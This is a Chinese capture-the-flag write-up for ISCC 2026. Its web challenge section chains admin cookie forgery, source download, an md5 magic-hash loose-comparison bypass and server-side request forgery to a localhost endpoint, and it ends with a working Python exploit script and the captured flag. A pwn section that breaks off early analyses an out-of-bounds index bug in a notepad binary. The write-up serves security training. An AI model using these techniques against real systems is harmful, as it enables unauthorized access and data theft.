---
title: "web"
lastmod: 2026-05-10T20:06:07+08:00
draft: false
---
网址：[练武题 | ISCC 2026](https://iscc.isclab.org.cn/challenges#deepvoid)
# web
## 1
### 夜班值守

#### 题目信息

- 题目地址：`http://39.105.213.28:49103`
- 目标：获取 flag

#### 题型判断

Web 题，核心是：

- 前端可控身份 Cookie
- 后台联调文件残留
- `md5` 松比较绕过
- 后台预览器访问本机内网接口

#### 关键线索

首页有 3 个很明显的提示：

1. 响应里直接下发：
   - `mail_user=guest`
   - `mail_role=user`
2. 邮件内容提示：
   - “前端页面会继续沿用浏览器侧那套旧标记，方便大家切身份联调”
3. 首页直接给了后台入口：
   - `/admin.php`

这说明管理员身份很可能是前端 Cookie 控制。

#### 利用过程

##### 1. 伪造管理员身份

将 Cookie 改为：

```http
mail_user=guest; mail_role=admin
```

即可访问：

```text
/admin.php
```

##### 2. 读取联调说明

后台页面有一个下载链接：

```text
/download.php?file=files/notes/preview-readme.txt
```

内容提到：

- 双人复核逻辑可直接查看：`admin.php`
- 路由命名规则看：`route-index.txt`

##### 3. 下载后台源码

访问：

```text
/download.php?file=admin.php
```

得到关键源码：

```php
$tokenA = (string)($_POST['token_a'] ?? '');
$tokenB = (string)($_POST['token_b'] ?? '');

if ($tokenA === '' || $tokenB === '') {
    exit('两份预览凭据都需要填写');
}

if ($tokenA === $tokenB) {
    exit('两份输入不能完全相同');
}

$h1 = md5($tokenA);
$h2 = md5($tokenB);

if ($h1 == $h2 && $h1 !== $h2) {
    echo "校验通过，允许继续请求诊断地址";
} else {
    echo "双人复核失败";
}
```

这是典型的 `md5` 魔术哈希绕过。

可用输入：

```text
token_a=QNKCDZO
token_b=240610708
```

两者不同，但 `md5()` 后都形如 `0e...`，在 `==` 下会被当成科学计数法数字比较为相等。

##### 4. 读取内部路由索引

访问：

```text
/download.php?file=files/notes/route-index.txt
```

得到：

```text
- health  -> /internal/health
- mailq   -> /internal/queue
- final   -> /internal/report?view=flag&slot=last
```

##### 5. 让后台请求本机诊断接口

题目提示后台只允许访问本机地址，因此不能直接请求外网地址，要让后台去访问：

```text
http://127.0.0.1/internal/report?view=flag&slot=last
```

注意这里能通的是 `127.0.0.1:80` 对应的地址，不是 `127.0.0.1:49103`。

提交后拿到 flag。

#### 最小利用脚本

```python
import requests
import re

base = "http://39.105.213.28:49103"
cookies = {
    "mail_user": "guest",
    "mail_role": "admin"
}

data = {
    "token_a": "QNKCDZO",
    "token_b": "240610708",
    "target_url": "http://127.0.0.1/internal/report?view=flag&slot=last"
}

r = requests.post(base + "/admin.php", cookies=cookies, data=data, timeout=10)
m = re.search(r"<textarea readonly>(.*?)</textarea>", r.text, re.S)
print(m.group(1).strip() if m else "no result")
```

#### 结果

```text
ISCC{D2EAa8tswDCHQj4CdVaJ}
```

#### 利用链总结

```text
Cookie 伪造管理员
-> 下载联调说明
-> 下载后台源码
-> md5 魔术哈希绕过双人复核
-> 利用后台访问 127.0.0.1 内部接口
-> 读取 flag
```
## 2
## 3
# pwn
## 1
先检查一下源码
```
pwndbg> checksec
File:     /mnt/hgfs/share/比赛/26iscc/区域赛/pwn/1/notepad
Arch:     amd64
RELRO:      No RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
canary打开了，难受
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  puts("========== Notepad-- Professional Edition ==========");
  puts("[1] Create Note");
  puts("[2] View Note");
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v4 = 0;
        printf("> ");
        __isoc99_scanf("%d", &v4);
        if ( v4 != 1 )
          break;
        create_note();
      }
      if ( v4 != 2 )
        break;
      view_note();
    }
  }
  while ( v4 != 3 );
  return 0;
}

ssize_t create_note()
{
  char *buf; // [rsp+8h] [rbp-8h]

  buf = (char *)get_note();
  printf("Name: ");
  read(0, buf, 0x10u);
  printf("Content: ");
  return read(0, buf + 16, 0x20u);
}

int view_note()
{
  char *s; // [rsp+8h] [rbp-8h]

  s = get_note();
  printf("Name: ");
  puts(s);
  printf("Content: ");
  return puts(s + 16);
}

char *get_note()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  printf("Index: ");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 9 )
  {
    printf("Index out of range!");
    exit(-1);
  }
  return (char *)&notes + 48 * v1;
}
```
main函数是一个不停的循环，要么create，要么view
get_note返回你访问全局变量node之后9的任意地方
但是他并没有进行变量校验，就是说你能访问任意node前面的变量
create是你能先写10个字节，然后再写20个字节
view是输出s和s+16
注意一下，只要没有\x00就可以一直输出，没有结束
node地址：35A0


